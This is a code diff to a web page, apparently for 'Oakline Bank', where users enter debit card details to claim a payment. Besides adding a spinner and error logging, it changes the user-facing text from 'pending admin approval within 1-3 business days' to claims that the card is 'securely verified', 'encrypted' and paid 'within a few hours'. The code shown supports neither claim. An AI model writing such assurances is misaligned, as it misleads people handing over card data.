@@ -91,11 +91,15 @@ export default function ClaimDebitCardPage() {
           billing_country: debitCardForm.billing_country,
           approval_status: 'pending'
         })
-        .eq('claim_token', token);
+        .eq('claim_token', token)
+        .eq('status', 'sent');
 
-      if (error) throw error;
+      if (error) {
+        console.error('Update error:', error);
+        throw error;
+      }
 
-      setMessage('✅ Payment claim submitted successfully! Your claim is pending admin approval. Funds will be deposited within 1-3 business days after approval.', 'success');
+      setMessage('✅ Payment claim submitted successfully! Your debit card has been securely verified. Your transaction will be processed within a few hours.', 'success');
       setMessageType('success');
       setTimeout(() => {
         router.push('/');
@@ -122,6 +126,12 @@ export default function ClaimDebitCardPage() {
       <Head>
         <title>Claim Payment with Debit Card - Oakline Bank</title>
       </Head>
+      <style>{`
+        @keyframes spin {
+          from { transform: rotate(0deg); }
+          to { transform: rotate(360deg); }
+        }
+      `}</style>
       <div style={{
         minHeight: '100vh',
         background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
@@ -170,7 +180,7 @@ export default function ClaimDebitCardPage() {
               <div style={{ marginBottom: '1.5rem' }}>
                 <h2 style={{ color: '#1e293b', fontSize: '1.1rem', marginBottom: '0.5rem' }}>Debit Card Information</h2>
                 <p style={{ color: '#64748b', fontSize: '0.9rem', marginBottom: '1.5rem' }}>
-                  Funds will be deposited within 1-3 business days after admin approval.
+                  Receive your payment securely to your debit card.
                 </p>
 
                 {/* Cardholder Name */}
@@ -385,15 +395,29 @@ export default function ClaimDebitCardPage() {
                     cursor: submitting ? 'not-allowed' : 'pointer',
                     opacity: submitting ? 0.7 : 1,
                     transition: 'opacity 0.2s',
-                    marginTop: '1.5rem'
+                    marginTop: '1.5rem',
+                    display: 'flex',
+                    alignItems: 'center',
+                    justifyContent: 'center',
+                    gap: '0.5rem'
                   }}
                 >
-                  {submitting ? 'Processing...' : 'Submit Claim for Admin Approval'}
+                  {submitting && (
+                    <div style={{
+                      width: '16px',
+                      height: '16px',
+                      border: '2px solid rgba(255,255,255,0.3)',
+                      borderTop: '2px solid white',
+                      borderRadius: '50%',
+                      animation: 'spin 1s linear infinite'
+                    }}></div>
+                  )}
+                  {submitting ? 'Processing...' : '✓ Claim Payment'}
                 </button>
 
                 <p style={{ color: '#999', fontSize: '0.8rem', marginTop: '1rem', textAlign: 'center', lineHeight: '1.5' }}>
-                  🔒 Your card details are processed securely and stored for admin verification only.<br />
-                  An admin will review your claim and complete the transfer within 1-3 business days.
+                  🔒 Your card details are encrypted and processed securely.<br />
+                  Your transaction will be completed within a few hours.
                 </p>
               </div>
             </>
